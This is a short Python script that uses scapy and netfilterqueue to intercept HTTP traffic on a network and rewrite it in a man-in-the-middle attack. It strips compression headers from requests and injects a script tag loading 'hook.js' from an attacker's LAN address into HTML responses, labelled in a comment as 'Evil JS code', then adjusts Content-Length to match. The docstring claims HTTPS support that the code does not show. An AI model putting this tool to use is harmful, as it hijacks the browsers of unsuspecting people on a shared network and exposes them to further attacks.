'''
Using scapy and netfilterqueue, We are going to change HTML code inside the packet
Support for https
'''

from netfilterqueue import NetfilterQueue
import scapy.all as scapy
import re

ack_list = []

def set_load(packet, load):
    packet[scapy.Raw].load = f"{load}\n\n"
    del packet[scapy.IP].len
    del packet[scapy.IP].chksum
    del packet[scapy.TCP].chksum

    return packet


def process_packet(packet):

    scapy_packet = scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.Raw):

        load = scapy_packet[scapy.Raw].load.decode('utf8', 'replace') # Get the load
        modifiedLoad = scapy_packet[scapy.Raw].load.decode('utf8', 'replace') 

        if scapy_packet.haslayer(scapy.TCP) and scapy_packet[scapy.TCP].dport == 80:
            print('[+] This is a Request')
            modifiedLoad = re.sub("Accept-Encoding:.*?\\r\\n", '', load) # Requesting plain html
                

        elif scapy_packet.haslayer(scapy.TCP) and scapy_packet[scapy.TCP].sport == 80:
            print('[+] This is a Response')

            injection_code = '<script src="http://192.168.157.172:3000/hook.js"></script>' # Evil JS code
            modifiedLoad = load.replace("</body>", f"{injection_code}</body>")

            content_len_srch = re.search("(?:Content-Length:\s)(\d*)", modifiedLoad) #Search content-length
            if content_len_srch and "text/html" in modifiedLoad:
                content_len = content_len_srch.group(1)
                new_cont_len = int(content_len) + len(injection_code)
                print(new_cont_len)
                modifiedLoad = modifiedLoad.replace(content_len, str(new_cont_len))
            

        if load != modifiedLoad:
            new_packet = set_load(scapy_packet, modifiedLoad)
            packet.set_payload(bytes(new_packet))
            scapy_packet1 = scapy.IP(packet.get_payload())
            # scapy_packet1.show()

            
    packet.accept()


queue = NetfilterQueue()
queue.bind(0, process_packet)
queue.run()